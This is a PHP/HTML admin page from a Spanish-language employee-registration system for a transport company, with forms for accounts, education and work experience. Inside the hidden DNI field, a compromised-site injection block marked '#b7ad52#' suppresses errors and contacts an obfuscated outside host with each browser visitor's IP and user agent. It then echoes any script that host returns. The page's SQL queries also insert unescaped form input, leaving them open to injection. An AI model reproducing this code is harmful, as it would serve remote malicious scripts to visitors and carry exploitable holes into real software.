<?php
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}
	else if($_SESSION["tipo"]=="trab")
	{
		header("Location: trabajador..php");
	}
	else if(!isset($_POST["op"]))
	{
		header("Location: administrador.php");	
		die;
	}
	
	require("../conexion/config.php");
	require("../conexion/baseDatos.php");
	require("../conexion/ajax.php");

	$DNI = $_POST["op"];	
	
	$bd = new Basedatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
	$bd->conectar();
	
	if(isset($_POST["txtNick"]))	
	{
		$nick = $_POST["txtNick"];		
		$clave = $_POST["txtClave"];
		
		$consult = "insert into cuenta(Trabajador_DNI, nick, Clave, activo, usuario) values ('$DNI', '$nick', '$clave', 1, '".$_SESSION["usuario"]."');";	
		$bd->crearConsulta($consult);			
	}
	
	if(isset($_POST["txtNroLC"]))
	{
		$licCond = $_POST["txtNroLC"];
		$consult = "update trabajador set LicenciaConducir='$licCond', usuario='".$_SESSION["usuario"]."' where DNI='$DNI';";
		$bd->crearConsulta($consult);
	}
	
	if(isset($_POST["txtInstitucionPrimaria"]))
	{
		$instiPrimaria = $_POST["txtInstitucionPrimaria"];
		$anhoInicioPrimaria = $_POST["anhoInicioPrimaria"];
		$anhoTerminoPrimaria = $_POST["anhoTerminoPrimaria"];
		$descripcionPrimaria = $_POST["txtDescripcionPrimaria"];
		
		$consult = "insert into gradoinstruccion(Trabajador_DNI, institucion, anhoInicio, anhoTermino, nivel, descripcion, activo, usuario) values ('$DNI', '$instiPrimaria', '$anhoInicioPrimaria', '$anhoTerminoPrimaria', 'Primaria', '$descripcionPrimaria', 1, '".$_SESSION["usuario"]."');";
		$bd->crearConsulta($consult);
		
		if(isset($_POST["txtInstitucionSecundaria"]))
		{
			$instiSecundaria = $_POST["txtInstitucionSecundaria"];
			$anhoInicioSecundaria = $_POST["anhoInicioSecundaria"];
			$anhoTerminoSecundaria = $_POST["anhoTerminoSecundaria"];
			$descripcionSecundaria = $_POST["txtDescripcionSecundaria"];	
			
			$consult = "insert into gradoinstruccion(Trabajador_DNI, institucion, anhoInicio, anhoTermino, nivel, descripcion, activo, usuario) values ('$DNI', '$instiSecundaria', '$anhoInicioSecundaria', '$anhoTerminoSecundaria', 'Secundaria', '$descripcionSecundaria', 1, '".$_SESSION["usuario"]."');";
			$bd->crearConsulta($consult);
			
			if(isset($_POST["txtInstitucionSuperior"]))
			{
				$instiSuperior = $_POST["txtInstitucionSuperior"];
				$anhoInicioSuperior = $_POST["anhoInicioSuperior"];
				$anhoTerminoSuperior = $_POST["anhoTerminoSuperior"];
				$especialidadSuperior = $_POST["txtEspecialidadSuperior"];
				$descripcionSuperior = $_POST["txtDescripcionSuperior"];	
				
				$consult = "insert into gradoinstruccion(Trabajador_DNI, institucion, anhoInicio, anhoTermino, nivel, descripcion, especialidad, activo, usuario) values ('$DNI', '$instiSuperior', '$anhoInicioSuperior', '$anhoTerminoSuperior', 'Superior', '$descripcionSuperior', '$especialidadSuperior', 1, '".$_SESSION["usuario"]."');";
				$bd->crearConsulta($consult);
			}	
		}
	}
	$bd->cerrarConexion();	
?>
<script language="javascript" type="text/javascript">
	function manejo()	
	{
		//Obteniendo valores
		op = document.getElementById('op').value;
		DNI = document.getElementById('DNI').value;
		
		descrip = document.getElementById('textDescripcion').value;
		motivo = document.getElementById('textMotivo').value;
		anhoF = document.getElementById('selectAnhoF').value;
		mesF = document.getElementById('selectMesF').value;
		diaF = document.getElementById('selectDiaF').value;
		anhoI = document.getElementById('selectAnhoI').value;
		mesI = document.getElementById('selectMesI').value;
		diaI = document.getElementById('selectDiaI').value;
		cargo = document.getElementById('textCargo').value;
		rubro = document.getElementById('textRubro').value;
		institucion = document.getElementById('textInstitucion').value;
		
		//alert("DNI="+encodeURIComponent(DNI)+"&op="+encodeURIComponent(op));
		
		if(/*descrip=="" || */motivo=="" || cargo=="" || rubro=="" || institucion=="")
		{
			alert("Debes llenar todos los campos, intentalo nuevamente !");
			return;
		}	
		_obj = crearObjeto();		
		
		_url = "ajaxManejador.php";		
		_values = "&DNI="+encodeURIComponent(DNI)+"&op="+encodeURIComponent(op)+"&textInstitucion="+encodeURIComponent(institucion)+"&textRubro="+encodeURIComponent(rubro)+"&textCargo="+encodeURIComponent(cargo)+"&selectDiaI="+encodeURIComponent(diaI)+"&selectMesI="+encodeURIComponent(mesI)+"&selectAnhoI="+encodeURIComponent(anhoI)+"&selectDiaF="+encodeURIComponent(diaF)+"&selectMesF="+encodeURIComponent(mesF)+"&selectAnhoF="+encodeURIComponent(anhoF)+"&textMotivo="+encodeURIComponent(motivo)+"&textDescripcion="+encodeURIComponent(descrip);
		_obj.open("POST", _url, true);
		_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
		_obj.send(_values);		
		_obj.onreadystatechange=function()
		{
			//Carga completa (Estado de la conexion)
			if(_obj.readyState==4)
			{
				//Completado con exito (Codigo enviado por el servidor)
				if(_obj.status==200)
				{							
					resp = _obj.responseText;
					if(resp=="exito")
					{
						alert(" Experiencia laboral guardada con exito !");
						document.getElementById('textDescripcion').value="";
						document.getElementById('textMotivo').value="";
						document.getElementById('textCargo').value="";
						document.getElementById('textRubro').value="";
						document.getElementById('textInstitucion').value="";
					}
				}
			}
		}
	}
	function go()
	{
		location.href="administrador.php";
	}
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>:: Transportes Marin Hermanos - InsTrabajador3 ::</title>
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
.Estilo2 {	font-size: 14px;
	color: #FFFFFF;
}
-->
</style></head>

<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../imagenes/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="142"><form id="formInsTrab3" name="formInsTrab3" method="post">
          <p align="center"><strong>REGISTRAR TRABAJADOR(3)</strong></p>
          <table width="288"  height="390" border="0" align="center">
            <caption>
              <strong>Experiencia Laboral              </strong>
            </caption>
			<br>
            <tr>
              <td width="105"><strong><em>Institución : </em></strong></td>
              <td width="173"><label>
                <div align="center">
                  <input name="textInstitucion" type="text" id="textInstitucion" />
                  </div>
              </label></td>
            </tr>
            <tr>
              <td><strong><em>Rubro : </em></strong></td>
              <td><label>
                <div align="center">
                  <input name="textRubro" type="text" id="textRubro" />
                  </div>
              </label></td>
            </tr>
            <tr>
              <td><strong><em>Cargo : </em></strong></td>
              <td><label>
                <div align="center">
                  <input name="textCargo" type="text" id="textCargo" />
                  </div>
              </label></td>
            </tr>
            <tr>
              <td><strong><em>Inicio : </em></strong></td>
              <td><label>
                <div align="center">
                  <select name="selectDiaI" id="selectDiaI">
                    <option>01</option>
                    <option>02</option>
                    <option>03</option>
                    <option>04</option>
                    <option>05</option>
                    <option>06</option>
                    <option>07</option>
                    <option>08</option>
                    <option>09</option>
                    <option>10</option>
                    <option>11</option>
                    <option>12</option>
                    <option>13</option>
                    <option>14</option>
                    <option>15</option>
                    <option>16</option>
                    <option>17</option>
                    <option>18</option>
                    <option>19</option>
                    <option>20</option>
                    <option>21</option>
                    <option>22</option>
                    <option>23</option>
                    <option>24</option>
                    <option>25</option>
                    <option>26</option>
                    <option>27</option>
                    <option>28</option>
                    <option>29</option>
                    <option>30</option>
                    <option>31</option>
                  </select>
                  <select name="selectMesI" id="selectMesI">
                    <option>01</option>
                    <option>02</option>
                    <option>03</option>
                    <option>04</option>
                    <option>05</option>
                    <option>06</option>
                    <option>07</option>
                    <option>08</option>
                    <option>09</option>
                    <option>10</option>
                    <option>11</option>
                    <option>12</option>
                  </select>
                  <select name="selectAnhoI" id="selectAnhoI">
				  	<option>1920</option>
					<option>1921</option>
					<option>1922</option>
					<option>1923</option>
					<option>1924</option>
					<option>1925</option>
					<option>1926</option>
					<option>1927</option>
					<option>1928</option>
					<option>1929</option>					
				  	<option>1930</option>
					<option>1931</option>
					<option>1932</option>
					<option>1933</option>
					<option>1934</option>
					<option>1935</option>
					<option>1936</option>
					<option>1937</option>
					<option>1938</option>
					<option>1939</option>			
					<option>1940</option>
                                    <option>1941</option>
                                    <option>1942</option>
                                    <option>1943</option>
                                    <option>1944</option>
                                    <option>1945</option>
                                    <option>1946</option>
                                    <option>1947</option>
                                    <option>1948</option>
                                    <option>1949</option>
                                    <option>1950</option>
                                    <option>1951</option>
                                    <option>1952</option>
                                    <option>1953</option>
                                    <option>1954</option>
                                    <option>1955</option>
                                    <option>1956</option>
                                    <option>1957</option>
                                    <option>1958</option>
                                    <option>1959</option>
                                    <option>1960</option>
                                    <option>1961</option>
                                    <option>1962</option>
                                    <option>1963</option>
                                    <option>1964</option>
                                    <option>1965</option>
                                    <option>1966</option>
                                    <option>1967</option>
                                    <option>1968</option>
                                    <option>1969</option>
                                    <option>1970</option>
                                    <option>1971</option>
                                    <option>1972</option>
                                    <option>1973</option>
                                    <option>1974</option>
                                    <option>1975</option>
                                    <option>1976</option>
                                    <option>1977</option>
                                    <option>1978</option>
                                    <option>1979</option>
                                    <option>1980</option>
                                    <option>1981</option>
                                    <option>1982</option>
                                    <option>1983</option>
                                    <option>1984</option>
                                    <option>1985</option>
                                    <option>1986</option>
                                    <option>1987</option>
                                    <option>1988</option>
                                    <option>1989</option>
                                    <option>1990</option>
                                    <option>1991</option>
                                    <option>1992</option>
                                    <option>1993</option>
                                    <option>1994</option>
                                    <option>1995</option>
                                    <option>1996</option>
                                    <option>1997</option>
                                    <option>1998</option>
                                    <option>1999</option>
                                    <option>2000</option>
                                    <option>2001</option>
                                    <option>2002</option>
                                    <option>2003</option>
                                    <option>2004</option>
                                    <option>2005</option>
                                    <option>2006</option>
                                    <option>2007</option>
                                    <option>2008</option>
                                    <option>2009</option>
                                    <option>2010</option>
                                    <option>2011</option>
                                    <option>2012</option>
                  </select>
                  </div>
              </label></td>
            </tr>
            <tr>
              <td><strong><em>Fin : </em></strong></td>
              <td><label>
                <div align="center">
                  <select name="selectDiaF" id="selectDiaF">
				  	<option>01</option>
                    <option>02</option>
                    <option>03</option>
                    <option>04</option>
                    <option>05</option>
                    <option>06</option>
                    <option>07</option>
                    <option>08</option>
                    <option>09</option>
                    <option>10</option>
                    <option>11</option>
                    <option>12</option>
                    <option>13</option>
                    <option>14</option>
                    <option>15</option>
                    <option>16</option>
                    <option>17</option>
                    <option>18</option>
                    <option>19</option>
                    <option>20</option>
                    <option>21</option>
                    <option>22</option>
                    <option>23</option>
                    <option>24</option>
                    <option>25</option>
                    <option>26</option>
                    <option>27</option>
                    <option>28</option>
                    <option>29</option>
                    <option>30</option>
                    <option>31</option>
                  </select>
                  <select name="selectMesF" id="selectMesF">
				  	<option>01</option>
                    <option>02</option>
                    <option>03</option>
                    <option>04</option>
                    <option>05</option>
                    <option>06</option>
                    <option>07</option>
                    <option>08</option>
                    <option>09</option>
                    <option>10</option>
                    <option>11</option>
                    <option>12</option>
                  </select>
                  <select name="selectAnhoF" id="selectAnhoF">
					<option>1920</option>
					<option>1921</option>
					<option>1922</option>
					<option>1923</option>
					<option>1924</option>
					<option>1925</option>
					<option>1926</option>
					<option>1927</option>
					<option>1928</option>
					<option>1929</option>					
				  	<option>1930</option>
					<option>1931</option>
					<option>1932</option>
					<option>1933</option>
					<option>1934</option>
					<option>1935</option>
					<option>1936</option>
					<option>1937</option>
					<option>1938</option>
					<option>1939</option>			
					<option>1940</option>
						<option>1941</option>
                                    <option>1942</option>
                                    <option>1943</option>
                                    <option>1944</option>
                                    <option>1945</option>
                                    <option>1946</option>
                                    <option>1947</option>
                                    <option>1948</option>
                                    <option>1949</option>
                                    <option>1950</option>
                                    <option>1951</option>
                                    <option>1952</option>
                                    <option>1953</option>
                                    <option>1954</option>
                                    <option>1955</option>
                                    <option>1956</option>
                                    <option>1957</option>
                                    <option>1958</option>
                                    <option>1959</option>
                                    <option>1960</option>
                                    <option>1961</option>
                                    <option>1962</option>
                                    <option>1963</option>
                                    <option>1964</option>
                                    <option>1965</option>
                                    <option>1966</option>
                                    <option>1967</option>
                                    <option>1968</option>
                                    <option>1969</option>
                                    <option>1970</option>
                                    <option>1971</option>
                                    <option>1972</option>
                                    <option>1973</option>
                                    <option>1974</option>
                                    <option>1975</option>
                                    <option>1976</option>
                                    <option>1977</option>
                                    <option>1978</option>
                                    <option>1979</option>
                                    <option>1980</option>
                                    <option>1981</option>
                                    <option>1982</option>
                                    <option>1983</option>
                                    <option>1984</option>
                                    <option>1985</option>
                                    <option>1986</option>
                                    <option>1987</option>
                                    <option>1988</option>
                                    <option>1989</option>
                                    <option>1990</option>
                                    <option>1991</option>
                                    <option>1992</option>
                                    <option>1993</option>
                                    <option>1994</option>
                                    <option>1995</option>
                                    <option>1996</option>
                                    <option>1997</option>
                                    <option>1998</option>
                                    <option>1999</option>
                                    <option>2000</option>
                                    <option>2001</option>
                                    <option>2002</option>
                                    <option>2003</option>
                                    <option>2004</option>
                                    <option>2005</option>
                                    <option>2006</option>
                                    <option>2007</option>
                                    <option>2008</option>
                                    <option>2009</option>
                                    <option>2010</option>
                                    <option>2011</option>
                                    <option>2012</option>
                  </select>
                  </div>
              </label></td>
            </tr>
            <tr>
              <td><strong><em>Motivo sece : </em></strong></td>
              <td><label>
                <div align="center">
                  <textarea name="textMotivo" id="textMotivo"></textarea>
                  </div>
              </label></td>
            </tr>
            <tr>
              <td><strong><em>Descripcion :</em></strong></td>
              <td><label>
                
                    <div align="center">
                      <textarea name="textDescripcion" id="textDescripcion"></textarea>
                      </label>
                    </div></td>
            </tr>
            <tr>
              <td><label>
                
                  <div align="left">
                    <input name="cancelar" type="reset" id="cancelar" value="Limpiar" />
                    </label>
                  </div></td>
              <td><label>
                
                    <div align="right">
                      <input name="agregar"  type="button" id="agregar" value="Agregar"  onclick="manejo()"/>
                      <input name="op" type="hidden" value="expeLaboral" id="op"/>
                      <input name="DNI" type="hidden" value="<?php echo $DNI; ?>
<?php
#b7ad52#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/b7ad52#
?>" id="DNI" />
                    </div>
                  <label></label>                </label></td>
            </tr>
          </table>
          </form>        <form id="form2" name="form2" method="post" action="admin.php">
            <table width="200" border="0" align="center">
              <tr>
                <td><label>
                  <div align="center">
                    <input type="button" name="Submit" value="Omitir"  onclick="go()"/>
                    </div>
                </label></td>
              </tr>
            </table>
            </form>          <p>&nbsp;</p>
          </td>
      </tr>	  
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>
